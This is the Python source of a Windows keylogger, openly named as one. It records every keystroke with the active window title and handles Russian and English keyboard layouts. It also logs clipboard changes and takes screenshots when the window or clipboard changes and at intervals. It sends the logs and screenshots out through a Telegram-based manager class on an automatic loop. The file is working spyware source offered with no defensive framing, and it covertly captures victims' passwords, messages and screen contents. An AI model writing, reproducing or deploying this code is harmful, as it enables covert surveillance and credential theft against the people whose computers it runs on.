import subprocess
import sys
def install_packages():
    packages = [
        "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
    ]
    for package in packages:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])


try:
    from pynput.keyboard import Key, Listener
    import logging
    import getpass
    import threading
    import time
    from pynput import keyboard
    import pyautogui
    import os
    from pynput.keyboard import Key, Listener
    from KeyloggerManager import TelegramKeylogger
    import win32api
    import win32gui
except ImportError:
    install_packages()

username = getpass.getuser()

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
file_handler = logging.FileHandler(f'logfile.txt', encoding='utf-8')
formatter = logging.Formatter('[{asctime}]: {message}', style='{', datefmt='%Y-%m-%d %H:%M:%S')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

KEY_MAPPING = {
    "EN": {
        65: 'a', 66: 'b', 67: 'c', 68: 'd', 69: 'e', 70: 'f', 71: 'g', 72: 'h', 73: 'i',
        74: 'j', 75: 'k', 76: 'l', 77: 'm', 78: 'n', 79: 'o', 80: 'p', 81: 'q', 82: 'r',
        83: 's', 84: 't', 85: 'u', 86: 'v', 87: 'w', 88: 'x', 89: 'y', 90: 'z',
        48: '0', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5', 54: '6', 55: '7', 56: '8', 57: '9',
        186: ';', 187: '=', 188: ',', 189: '-', 190: '.', 191: '/', 192: '`',
        219: '[', 220: '\\', 221: ']', 222: "'", 32: ' ', 110: '.', 111: '/', 106: '*', 109: '-', 107: '+'
    },
    "EN_SHIFT": {
        65: 'A', 66: 'B', 67: 'C', 68: 'D', 69: 'E', 70: 'F', 71: 'G', 72: 'H', 73: 'I',
        74: 'J', 75: 'K', 76: 'L', 77: 'M', 78: 'N', 79: 'O', 80: 'P', 81: 'Q', 82: 'R',
        83: 'S', 84: 'T', 85: 'U', 86: 'V', 87: 'W', 88: 'X', 89: 'Y', 90: 'Z',
        48: ')', 49: '!', 50: '@', 51: '#', 52: '$', 53: '%', 54: '^', 55: '&', 56: '*', 57: '(',
        186: ':', 187: '+', 188: '<', 189: '_', 190: '>', 191: '?', 192: '~',
        219: '{', 220: '|', 221: '}', 222: '"', 32: ' '
    },
    "RU": {
        65: 'ф', 66: 'и', 67: 'с', 68: 'в', 69: 'у', 70: 'а', 71: 'п', 72: 'р', 73: 'ш',
        74: 'о', 75: 'л', 76: 'д', 77: 'ь', 78: 'т', 79: 'щ', 80: 'з', 81: 'й', 82: 'к',
        83: 'ы', 84: 'е', 85: 'г', 86: 'м', 87: 'ц', 88: 'ч', 89: 'н', 90: 'я',
        48: '0', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5', 54: '6', 55: '7', 56: '8', 57: '9',
        186: 'ж', 187: '=', 188: 'б', 189: '-', 190: 'ю', 191: '.', 192: 'ё',
        219: 'х', 220: '\\', 221: 'ъ', 222: 'э', 32: ' ', 110: '.', 111: '/', 106: '*', 109: '-', 107: '+'
    },
    "RU_SHIFT": {
        65: 'Ф', 66: 'И', 67: 'С', 68: 'В', 69: 'У', 70: 'А', 71: 'П', 72: 'Р', 73: 'Ш',
        74: 'О', 75: 'Л', 76: 'Д', 77: 'Ь', 78: 'Т', 79: 'Щ', 80: 'З', 81: 'Й', 82: 'К',
        83: 'Ы', 84: 'Е', 85: 'Г', 86: 'М', 87: 'Ц', 88: 'Ч', 89: 'Н', 90: 'Я',
        48: ')', 49: '!', 50: '"', 51: '№', 52: ';', 53: '%', 54: ':', 55: '?', 56: '*', 57: '(',
        186: 'Ж', 187: '+', 188: 'Б', 189: '_', 190: 'Ю', 191: ',', 192: 'Ё',
        219: 'Х', 220: '/', 221: 'Ъ', 222: 'Э', 32: ' '
    }
}

RU_TO_EN = {
    'ф':'a', 'и':'b', 'с':'c', 'в':'d', 'у':'e', 'а':'f', 'п':'g', 'р':'h', 'ш':'i',
    'о':'j', 'л':'k', 'д':'l', 'ь':'m', 'т':'n', 'щ':'o', 'з':'p', 'й':'q', 'к':'r',
    'ы':'s', 'е':'t', 'г':'u', 'м':'v', 'ц':'w', 'ч':'x', 'н':'y', 'я':'z',
    'Ф':'A', 'И':'B', 'С':'C', 'В':'D', 'У':'E', 'А':'F', 'П':'G', 'Р':'H', 'Ш':'I',
    'О':'J', 'Л':'K', 'Д':'L', 'Ь':'M', 'Т':'N', 'Щ':'O', 'З':'P', 'Й':'Q', 'К':'R',
    'Ы':'S', 'Е':'T', 'Г':'U', 'М':'V', 'Ц':'W', 'Ч':'X', 'Н':'Y', 'Я':'Z'
}
current_layout = "RU"
shift_pressed = False
alt_pressed = False

def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except Exception:
        return "unknown"

def get_char_from_vk(vk_code, shift, layout):
    try:
        if layout == "RU":
            mapping = KEY_MAPPING["RU_SHIFT"] if shift else KEY_MAPPING["RU"]
        else:
            mapping = KEY_MAPPING["EN_SHIFT"] if shift else KEY_MAPPING["EN"]
        char = mapping.get(vk_code, f"[VK:{vk_code}]")
        return char
    except:
        return f"[ERROR]"

def check_alt_shift_in_log():
    global current_layout
    alt_found = False
    shift_found = False
    while True:
        try:
            with open('logfile.txt', 'r', encoding='utf-8') as f:
                lines = f.readlines()[-2:]
            alt_found = any("'[Key.alt_l]'" in line or "'[Key.alt_r]'" in line for line in lines)
            shift_found = any("'[Key.shift]'" in line or "'[Key.shift_r]'" in line for line in lines)
            if alt_found and shift_found:
                current_layout = "EN" if current_layout == "RU" else "RU"
                logger.info(f"LAYOUT_SWITCHED by LogScan: {current_layout}")
                time.sleep(1)
        except Exception as e:
            logger.error(f"Error reading logfile for layout switch: {e}")
        time.sleep(1)

def on_press(key):
    global shift_pressed, alt_pressed, current_layout
    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
            alt_pressed = True

        vk = getattr(key, 'vk', None)
        sc = getattr(key, 'scan_code', None)
        active_window = get_active_window()

        char = ""
        if vk is not None:
            char = get_char_from_vk(vk, shift_pressed, current_layout)
        else:
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '[ENTER]',
                keyboard.Key.tab: '[TAB]',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.delete: '[DEL]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.caps_lock: '[CAPS_LOCK]',
            }
            if key in special_keys:
                char = special_keys[key]
            else:
                char = f"[{key}]"

        modifiers = []
        if shift_pressed:
            modifiers.append("SHIFT")
        if alt_pressed:
            modifiers.append("ALT")

        modifier_str = "+".join(modifiers) if modifiers else "NONE"

        logger.info(f"{active_window} | '{char}'")

    except Exception as e:
        logger.error(f"Error in on_press: {e}")

def on_release(key):
    global shift_pressed, alt_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False
    elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
        alt_pressed = False
    if key == keyboard.Key.esc:
        keylogger_manager.stop()
        return False

def clipboard_monitor(interval=5):
    import pyperclip
    recent = ""
    while True:
        try:
            current = pyperclip.paste()
        except Exception:
            current = ""
        if current != recent and current.strip():
            recent = current
            logger.info(f"CLIPBOARD_CHANGED: {recent}")
        time.sleep(interval)


def screenshot_monitor(interval=120):
    count = 0
    last_window = ""
    last_screenshot_time = 0
    last_clipboard_content = ""

    def is_same_window(window1, window2):
        if window1 == window2:
            return True

        ignore_patterns = [' - Прокрутка', ' - Scroll', '...', ' — ']

        if window1 and window2:
            base1 = window1[:20]
            base2 = window2[:20]
            if base1 == base2:
                return True

            for pattern in ignore_patterns:
                if pattern in window1 and pattern in window2:
                    return True

        return False

    while True:
        try:
            current_time = time.time()
            current_window = get_active_window()

            if (not is_same_window(current_window, last_window) and
                    current_window != "unknown" and
                    current_time - last_screenshot_time > 15):

                logger.info(f"Window changed: {last_window} -> {current_window}")
                img = pyautogui.screenshot()
                success = keylogger_manager.send_screenshot(img)

                if success:
                    logger.info(f"Screenshot sent successfully (window change) #{count}")
                count += 1
                last_window = current_window
                last_screenshot_time = current_time
            else:
                last_window = current_window

            try:
                import pyperclip
                current_clipboard = pyperclip.paste()
                if (current_clipboard != last_clipboard_content and
                        current_clipboard.strip() and
                        current_time - last_screenshot_time > 10):

                    logger.info(f"Clipboard changed")
                    img = pyautogui.screenshot()
                    success = keylogger_manager.send_screenshot(img)

                    if success:
                        logger.info(f"Screenshot sent successfully (clipboard) #{count}")
                    count += 1
                    last_clipboard_content = current_clipboard
                    last_screenshot_time = current_time
            except:
                pass

            if current_time - last_screenshot_time > interval:
                img = pyautogui.screenshot()
                success = keylogger_manager.send_screenshot(img)

                if success:
                    logger.info(f"Screenshot sent successfully (periodic) #{count}")
                count += 1
                last_screenshot_time = current_time

            time.sleep(2)

        except Exception as e:
            logger.error(f"Error in screenshot_monitor: {e}")
            time.sleep(10)

logger.info(f"PROGRAM_STARTED | Initial layout: {current_layout}")

threading.Thread(target=clipboard_monitor, daemon=True).start()
threading.Thread(target=screenshot_monitor, daemon=True).start()
threading.Thread(target=check_alt_shift_in_log, daemon=True).start()

keylogger_manager = TelegramKeylogger()
send_thread = threading.Thread(target=keylogger_manager.auto_send_loop)
send_thread.daemon = True
send_thread.start()

print(f"Keylogger started! Sending logs every {keylogger_manager.send_interval} seconds")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
